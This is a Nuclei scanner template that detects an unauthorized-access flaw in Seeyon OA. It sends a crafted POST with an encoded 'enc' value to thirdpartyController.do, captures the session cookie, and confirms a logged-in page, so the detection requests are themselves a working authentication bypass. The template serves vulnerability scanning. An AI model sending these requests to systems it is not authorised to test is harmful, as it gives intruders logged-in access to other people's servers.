id: seeyon-unauthorized-access
info:
  name: Seeyon Unauthorized Access
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Identifies unauthorized access vulnerability in Seeyon OA by leveraging specific endpoints and cookies.
http:
  - raw:
      - |
        POST /seeyon/thirdpartyController.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
    extractors:
      - type: regex
        name: session
        part: header
        regex:
          - 'JSESSIONID=(.+?);'
        internal: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "set-cookie"
  - raw:
      - |
        GET /seeyon/main.do HTTP/1.1
        Host: {{Hostname}}
        Cookie: JSESSIONID={{session}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "当前已登录了一个用户，同一窗口中不能登录多个用户"
